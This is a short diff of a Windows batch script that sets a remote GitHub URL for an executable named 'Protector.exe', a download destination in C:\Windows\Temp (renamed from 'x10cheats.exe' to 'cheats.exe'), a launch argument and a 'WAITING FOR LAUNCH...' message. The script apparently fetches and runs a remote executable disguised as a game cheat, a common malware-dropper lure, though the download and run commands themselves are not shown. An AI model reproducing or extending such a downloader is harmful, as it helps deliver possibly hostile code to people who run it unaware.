@@ -1,6 +1,6 @@
 @echo off
 set "url=https://raw.githubusercontent.com/Ahetuk/Free/main/Protector.exe"
-set "destination=C:\Windows\Temp\x10cheats.exe"
+set "destination=C:\Windows\Temp\cheats.exe"
 set "arguments=Apply"
 
 echo WAITING FOR LAUNCH...
